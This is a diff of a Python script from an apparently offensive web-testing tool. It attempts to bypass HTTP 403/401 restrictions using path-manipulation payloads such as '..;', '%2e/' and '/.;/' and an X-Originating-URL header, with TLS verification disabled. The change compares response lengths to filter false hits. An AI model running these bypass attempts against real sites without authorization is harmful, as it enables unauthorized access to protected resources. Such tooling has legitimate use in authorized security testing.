@@ -24,16 +24,14 @@ def IP_authorization(res, url):
 		print("{}[{}] {} Forbidden Bypass with: 'X-Originating-URL: {}'".format(BYP, req.status_code, url+page, page))
 
 
-def other_bypass(url, page):
+def other_bypass(url, page, req_url):
 	payl = [page+"/.", "/"+page+"/", "./"+page+"/./", "%2e/"+page, page+"/.;/", ".;/"+page, page+"..;", page+"/;/"] #http://exemple.com/+page+bypass
 	for p in payl:
 		url_b = url + p
 		req = requests.get(url_b, verify=False)
-		if req.status_code not in [403, 401, 404, 429, 301, 302, 400, 408, 503, 405, 428, 412]:
-			print("{}[{}] Forbidden Bypass with: {}".format(BYP, req.status_code, url_b))
-		elif req.status_code in [302, 301]:
-			if 200 in req.history:
-				print("{}[{}] Forbidden Bypass with: {}".format(BYP, req.status_code, url_b))
+		if req.status_code not in [403, 401, 404, 429, 301, 302, 400, 408, 503, 405, 428, 412] and len(req.content) != len(req_url.content):
+			print("{}[{}] Forbidden Bypass with : {}".format(BYP, req.status_code, url_b))
+
 
 
 def bypass_forbidden(res):
@@ -51,7 +49,7 @@ def bypass_forbidden(res):
 	else:
 		original_url(res, page, url)
 		IP_authorization(res, url)
-		other_bypass(url, page)
+		other_bypass(url, page, req_url)
 
 
 """if __name__ == '__main__':
